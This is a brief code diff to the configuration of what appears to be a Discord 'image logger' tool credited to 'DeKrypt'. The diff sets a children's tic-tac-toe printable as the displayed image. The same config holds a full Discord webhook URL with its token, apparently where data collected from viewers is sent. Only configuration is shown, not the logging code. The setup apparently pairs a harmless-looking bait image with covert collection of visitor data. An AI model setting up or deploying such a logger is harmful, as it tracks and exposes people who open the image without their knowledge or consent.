@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1074423385506971648/cN4mntnF9y8MBsZxC2f_Re32VgvvF1UR03cZBW3DQFZS0bCmyZX5Bgnur7e_uUVl3S5l",
-    "image": "", # You can also have a custom image by using a URL argument
+    "image": "https://childhoodmagic.com/wp-content/uploads/2022/09/Childhood-Magic-Winter-tic-tac-toe-printable-bw-1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
     # CUSTOMIZATION #
